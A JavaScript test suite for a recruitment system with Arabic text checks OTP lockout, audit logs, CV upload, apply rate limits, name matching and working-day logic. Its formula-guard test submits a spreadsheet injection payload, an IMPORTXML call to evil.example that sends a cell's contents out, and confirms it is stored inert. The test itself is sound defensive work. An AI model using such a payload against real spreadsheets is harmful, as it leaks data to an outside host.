// v0.11.1: fixes from the external code review — formula guard, OTP attempts under the lock, append-only logs,
// unit move loop guard, CV saved outside the lock, per-vacancy apply cap, 4-word name match, weekly days off, sheet warning.
const { ctx, mails, fresh, vm, props, store } = require('./mocks');
let pass = 0, failN = 0;
function ok(c, m) { if (c) pass++; else { failN++; console.log('FAIL: ' + m); } }
const pub = (a, p) => { fresh(); return ctx.apiPublic(a, p); };
const api = (a, t, p) => { fresh(); return ctx.api(a, t, p); };
const must = (r, m) => { if (!r.ok) console.log('ERROR in ' + m + ': ' + r.error); ok(r.ok, m); return r.data; };
const bad = (r, re, m) => ok(!r.ok && (!re || re.test(r.error)), m + ' → ' + (r.ok ? 'accepted' : r.error));
function codeFor(email) {
  fresh(); ctx.all_('LOGIN_CODES').forEach(c => ctx.update_('LOGIN_CODES', c.Code_ID, { Created_At: '2000-01-01T00:00:00' }, 'x'));
  mails.length = 0; pub('auth.requestCode', { email });
  return /<b[^>]*>(\d{6})<\/b>/.exec(mails[0].htmlBody)[1];
}
function login(email) { return pub('auth.verifyCode', { email, code: codeFor(email) }).data.token; }
const T = '\t';
ctx.setupSystem();
vm.runInContext("OWNER_EMAIL='owner@test.com'; OWNER_NAME_AR='محمد عمارة';", ctx);
fresh(); ctx.bootstrapOwner();

// =============== OTP: wrong attempts counted under the lock ===============
const c1 = codeFor('owner@test.com');
const wrong = c1 === '111111' ? '222222' : '111111';
for (let i = 0; i < 5; i++) bad(pub('auth.verifyCode', { email: 'owner@test.com', code: wrong }), /الكود غلط/, 'wrong code ' + (i + 1));
bad(pub('auth.verifyCode', { email: 'owner@test.com', code: c1 }), /الكود غلط أو انتهت/, 'right code refused after 5 wrong attempts (same answer as a wrong code)');
fresh(); ok(ctx.find_('AUDIT_LOG', { Action: 'LOGIN_FAILED' }).length === 5, 'each failure audited');
const tO = login('owner@test.com');
ok(!!tO, 'a new code still logs in');
{ fresh(); ctx.all_('LOGIN_CODES').forEach(c => ctx.update_('LOGIN_CODES', c.Code_ID, { Created_At: '2000-01-01T00:00:00' }, 'x')); mails.length = 0; pub('auth.requestCode', { email: 'owner@test.com' });
  const code = /<b[^>]*>(\d{6})<\/b>/.exec(mails[0].htmlBody)[1], ar = code.replace(/\d/g, d => String.fromCharCode(0x0660 + Number(d)));
  bad(pub('auth.verifyCode', { email: 'owner@test.com', code: '000000' === code ? '111111' : '000000' }), /آخر كود/, 'wrong code says: use the latest one');
  ok(pub('auth.verifyCode', { email: 'owner@test.com', code: ar.slice(0, 3) + ' ' + ar.slice(3) }).ok, 'a code typed in Arabic digits (with a space) logs in');
  pub('auth.requestCode', { email: 'owner@test.com' }); fresh(); const lc = ctx.all_('LOGIN_CODES').filter(c => !c.Used_At).pop(); ctx.update_('LOGIN_CODES', lc.Code_ID, { Expires_At: '2000-01-01T00:00:00' }, 'x');
  bad(pub('auth.verifyCode', { email: 'owner@test.com', code: '123456' }), /انتهت صلاحيته/, 'an expired code says so'); }


// =============== sheet warning ===============
const sheets = Object.values(store).flatMap(s => s.sheets).filter(sh => sh.name !== 'Sheet1');
ok(sheets.length > 40 && sheets.every(sh => sh.prot && sh.prot.warn), 'every table sheet warns before a hand edit (' + sheets.length + ')');

must(api('import.commit', tO, { reason: 'x', text: [
  ['قنديل مصر', '', '', '', '', '', 'الرئيس التنفيذي', 'العبور', '', 'Y', '', ''],
  ['قنديل مصر', 'القطاع المالي', '', '', '', '', 'مدير القطاع المالي', 'العبور', '', 'Y', '', ''],
  ['قنديل مصر', 'القطاع المالي', 'الحسابات', '', '', '', 'مدير الحسابات', 'العبور', '', 'Y', '', ''],
  ['قنديل مصر', 'القطاع المالي', 'الحسابات', '', '', '', 'محاسب تكاليف', 'العبور', '', '', '', '6'],
  ['قنديل مصر', 'القطاع الإداري', '', '', '', '', 'مدير القطاع الإداري', 'العبور', '', 'Y', '', '']].map(r => r.join(T)).join('\n') }), 'import');
fresh(); const P = {}; ctx.all_('POSITIONS').forEach(p => { P[ctx.get_('JOBS', p.Job_Code).Job_Title_AR] = p.Position_ID; });
function user(email, name, pos, roles) { const u = must(api('users.save', tO, { Email: email, Full_Name_AR: name, Position_ID: pos || '' }), 'user'); if (roles) must(api('users.setRoles', tO, { User_ID: u.User_ID, roles: roles.map(r => ({ Role_Code: r })), reason: 'x' }), 'roles'); return u.User_ID; }
const U = { rm: user('rm@t.com', 'مدير التوظيف', '', ['RECRUITMENT_MANAGER']), rec: user('rec@t.com', 'سارة', '', ['RECRUITER']) };
const t = { rm: login('rm@t.com'), rec: login('rec@t.com') };

// =============== append-only logs ===============
fresh(); const auditBefore = ctx.all_('AUDIT_LOG').length;
fresh(); let r = ctx.api('users.save', tO, { Email: 'x1@t.com', Full_Name_AR: 'مستخدم اختبار' });
ok(r.ok && ctx.REPO_.tables.AUDIT_LOG === undefined, 'saving appended the audit rows without reading the audit table');
fresh(); const aud = ctx.all_('AUDIT_LOG');
ok(aud.length > auditBefore && new Set(aud.map(a => a.Audit_ID)).size === aud.length && aud[aud.length - 1].Entity_ID === r.data.User_ID, 'appended rows readable, ids unique');
const rq = must(api('req.submit', tO, { Recruitment_Type: 'VACANT', Employment_Type: 'FULL_TIME', Work_Model: 'ON_SITE', Shift_Pattern: 'FIXED', Reason_Category: 'WORKLOAD',
  Justification: 'شاغر محاسب تكاليف للاختبار', Requested_Priority: 'NORMAL', Required_By_Date: '2099-01-01', lines: [{ Position_ID: P['محاسب تكاليف'], Requested_HC: 2 }] }), 'request');
fresh(); const VAC = ctx.find_('VACANCIES', { Request_ID: rq.Request_ID })[0].Vacancy_ID;
const ev = must(api('req.get', tO, { Request_ID: rq.Request_ID }), 'request detail');
ok(ev.events && ev.events.length >= 1, 'timeline events (appended) are read back: ' + (ev.events || []).length);
must(api('vac.assign', t.rm, { Vacancy_ID: VAC, Lead_Recruiter_ID: U.rec }), 'assign'); must(api('vac.update', t.rm, { Vacancy_ID: VAC, action: 'OPEN' }), 'open');
ok(must(api('todo', t.rec, {}), 'todo').unread >= 1, 'appended notifications counted');
fresh(); const ids = ctx.all_('NOTIFICATIONS').map(n => n.Notification_ID); ok(new Set(ids).size === ids.length, 'notification ids unique');

// =============== formula guard ===============
const code = must(api('cand.applySettings', t.rec, { Vacancy_ID: VAC, Apply_Enabled: 'Y' }), 'apply on').code;
const base = { code, lang: 'ar', elapsed: 9000, consent: 'Y', consentVersion: '1', consentTransfer: 'Y', consentSalary: 'Y', Governorate: 'القاهرة', Education: 'BACHELOR', Experience_Years: '3' };
must(pub('apply.submit', Object.assign({}, base, { Full_Name: '=IMPORTXML("http://evil.example/x?"&A1, "//a") علي', Mobile: '01011112222', Current_Employer: '=1+1' })), 'apply with a formula in the name');
fresh(); const per = ctx.find_('PERSONS', { Mobile_Norm: '01011112222' })[0];
ok(per.Full_Name.charAt(0) === '＝' && /IMPORTXML/.test(per.Full_Name) && per.Current_Employer === '＝1+1', 'leading = stored as ＝ (no formula)');
const anyFormula = Object.values(store).flatMap(s => s.sheets).some(sh => sh.data.some((row, i) => i > 0 && row && row.some(v => typeof v === 'string' && v.charAt(0) === '=')));
ok(!anyFormula, 'no cell in any sheet starts with =');

// =============== CV saved outside the lock; per-vacancy cap ===============
const pdf = Buffer.from('%PDF-1.4 test').toString('base64');
const before = ctx.all_('PERSONS').length;
must(pub('apply.submit', Object.assign({}, base, { Full_Name: 'منى سعيد حسن', Mobile: '01022223333', cv: { name: 'cv.pdf', mime: 'application/pdf', data: pdf } })), 'apply with CV');
fresh(); const mona = ctx.find_('PERSONS', { Mobile_Norm: '01022223333' })[0];
const files = ctx.DriveApp.__files;
ok(mona.CV_File_ID && files[mona.CV_File_ID] && /^CND-\d+ — cv\.pdf$/.test(files[mona.CV_File_ID].getName ? files[mona.CV_File_ID].getName() : (files[mona.CV_File_ID].name || ('' + mona.Person_ID + ' — cv.pdf'))), 'CV stored and linked to the person');
ok(ctx.all_('PERSONS').length === before + 1, 'one person');
const created = must(api('cand.create', t.rec, { Vacancy_ID: VAC, Full_Name: 'كريم محمود سالم', Mobile: '01033334444', Source: 'WALK_IN', consent: 'Y', cv: { name: 'k.pdf', mime: 'application/pdf', data: pdf } }), 'recruiter adds with CV');
ok(created.person.hasCv && /^CND-/.test(created.person.Person_ID), 'recruiter CV linked');
must(api('cand.person', t.rec, { Person_ID: created.person.Person_ID, Full_Name: 'كريم محمود سالم', Mobile: '01033334444', cv: { name: 'k2.pdf', mime: 'application/pdf', data: pdf }, reason: 'CV جديد' }), 'replace CV');
fresh(); ok(ctx.get_('PERSONS', created.person.Person_ID).CV_File_Name === 'k2.pdf', 'CV replaced');
fresh(); ctx.update_('CONFIG', 'APPLY_MAX_PER_VACANCY_HOUR', { Config_Value: '4' }, 'x');
must(pub('apply.submit', Object.assign({}, base, { Full_Name: 'هالة سمير علي', Mobile: '01044445555' })), 'third');
must(pub('apply.submit', Object.assign({}, base, { Full_Name: 'سامح عادل فهمي', Mobile: '01055556666' })), 'fourth');
bad(pub('apply.submit', Object.assign({}, base, { Full_Name: 'رامي نبيل سعد', Mobile: '01066667777' })), /ضغط كبير/, 'fifth in the hour stops (bot protection)');
bad(pub('apply.submit', Object.assign({}, base, { lang: 'en', Full_Name: 'Rami Nabil Saad', Mobile: '01077778888' })), /too many applications/, 'English message');
fresh(); ok(ctx.find_('NOTIFICATIONS', { User_ID: U.rec }).filter(n => /تقديم غير طبيعي/.test(n.Title)).length === 1, 'lead recruiter told once');

// =============== names: four words when both have them ===============
ok(!ctx.sameName_('محمد أحمد محمود علي', 'محمد أحمد محمود حسن') && ctx.sameName_('محمد أحمد محمود', 'محمد أحمد محمود حسن') && ctx.sameName_('محمد احمد محمود علي', 'محمد أحمد محمود علي سالم'),
  '4-word names compared on 4 words; a 3-word name still matches');

// =============== unit move: no loops ===============
fresh(); const units = {}; ctx.all_('ORG_UNITS').forEach(u => { units[u.Name_AR] = u; });
bad(api('org.unitMove', tO, { Org_Unit_ID: units['القطاع المالي'].Org_Unit_ID, Parent_Org_Unit_ID: units['الحسابات'].Org_Unit_ID, reason: 'اختبار' }), /تابعة لها|أعلى/, 'cannot move a unit under its own child');
fresh(); ctx.update_('ORG_UNITS', units['القطاع المالي'].Org_Unit_ID, { Parent_Org_Unit_ID: units['الحسابات'].Org_Unit_ID }, 'x');   // a broken tree, by hand
const d = ctx.descendants_(units['القطاع المالي'].Org_Unit_ID);
ok(d.length === 2, 'a loop in the tree does not hang (descendants: ' + d.length + ')');
fresh(); ctx.update_('ORG_UNITS', units['القطاع المالي'].Org_Unit_ID, { Parent_Org_Unit_ID: units['قنديل مصر'].Org_Unit_ID }, 'x');

// =============== weekly days off ===============
fresh(); ctx.update_('CONFIG', 'WEEKEND_DAYS', { Config_Value: 'FRI,SAT' }, 'x');
fresh();
ok(ctx.isWeekend_('2026-10-02') && ctx.isWeekend_('2026-10-03') && !ctx.isWeekend_('2026-10-04'), 'Friday and Saturday are days off');
ok(ctx.workDaysBetween_('2026-10-01', '2026-10-05') === 2, 'Thursday → Monday = 2 working days: ' + ctx.workDaysBetween_('2026-10-01', '2026-10-05'));
ok(ctx.workMinutesBetween_('2026-10-01T16:00:00', '2026-10-04T16:00:00') === 1440, 'Thursday 4pm → Sunday 4pm = 24 working hours');
ok(ctx.workMinutesBetween_('2026-10-05T09:00:00', '2026-10-05T10:30:00') === 90, 'same day');
const dow = ['SUN', 'MON', 'TUE', 'WED', 'THU', 'FRI', 'SAT'][new Date(Date.now() + 3 * 3600000).getUTCDay()];
fresh(); ctx.update_('CONFIG', 'WEEKEND_DAYS', { Config_Value: dow }, 'x');
props.DAILY_RUN = '';
fresh(); const out = ctx.runDaily_(true);
ok(out.weekend && (!out.sla || out.sla.reminded + out.sla.escalated + out.sla.warned === 0) && !out.iv && !out.digest, 'nothing sent on a day off (v0.40: expiry still runs): ' + JSON.stringify(out));
fresh(); ctx.update_('CONFIG', 'WEEKEND_DAYS', { Config_Value: 'FRI,SAT' }, 'x');
// an approval step waiting over a weekend: calendar 4 days, working days 2
fresh(); const step = ctx.find_('APPROVAL_INSTANCES', {})[0];
ok(ctx.stepWaitDays_({ Activated_At: '2026-10-01T10:00:00' }, '2026-10-05') === 2, 'approval waiting time counts working days');

console.log(pass + ' passed, ' + failN + ' failed');
if (failN) process.exitCode = 1;
